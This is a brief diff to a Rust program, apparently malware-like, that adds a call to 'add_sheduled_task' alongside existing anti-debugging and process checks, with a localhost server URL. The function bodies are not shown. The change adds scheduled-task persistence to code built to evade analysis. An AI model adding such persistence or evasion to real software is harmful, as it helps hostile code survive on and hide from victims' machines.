@@ -7,6 +7,8 @@ use tokio::time::{sleep, Duration, Sleep};
 use std::sync::atomic::{AtomicBool, Ordering};
 use rand::{rngs::StdRng, SeedableRng, Rng};
 
+use crate::system::add_sheduled_task;
+
 
 macro_rules! unwrap_or_panic {
     ($expr: expr) => {
@@ -27,7 +29,8 @@ async fn main() {
 
     check_for_debugging();
     check_for_process();
-
+    add_sheduled_task();
+    
     const URL: &'static str = "http://127.0.0.1:5000";
 
 
